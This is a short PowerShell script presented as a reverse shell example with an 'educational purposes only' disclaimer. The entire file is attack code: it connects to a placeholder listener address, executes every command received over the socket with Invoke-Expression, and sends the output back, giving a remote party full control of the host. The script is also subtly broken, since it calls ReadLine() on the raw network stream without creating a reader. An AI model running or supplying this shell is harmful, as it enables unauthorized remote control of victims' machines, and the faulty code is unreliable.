# PowerShell Reverse Shell Example
# DISCLAIMER: This script is for educational purposes only. Use responsibly and ethically.

# Define the IP address and port number of the netcat listener
$IPAddress = 'YOUR_LISTENER_IP'
$Port = YOUR_LISTENER_PORT

# Create a TCP/IP socket and connect to the listener
$Client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
$Stream = $Client.GetStream()

# Create a writer for sending data to the listener
$Writer = New-Object System.IO.StreamWriter($Stream)

# Send a greeting or notification to the listener
$Writer.WriteLine("Reverse shell established.")
$Writer.Flush()

# Continue to listen for commands from the netcat listener
while(($Command = $Stream.ReadLine()) -ne $null)
{
    try
    {
        # Execute the received command
        $Output = Invoke-Expression $Command 2>&1 | Out-String

        # Send the command output back to the listener
        $Writer.WriteLine($Output)
        $Writer.Flush()
    }
    catch
    {
        # Handle potential errors gracefully
        $ErrorMessage = $_.Exception.Message
        $Writer.WriteLine("Error executing command: $ErrorMessage")
        $Writer.Flush()
    }
}

# Cleanup and close the connection
$Client.Close()
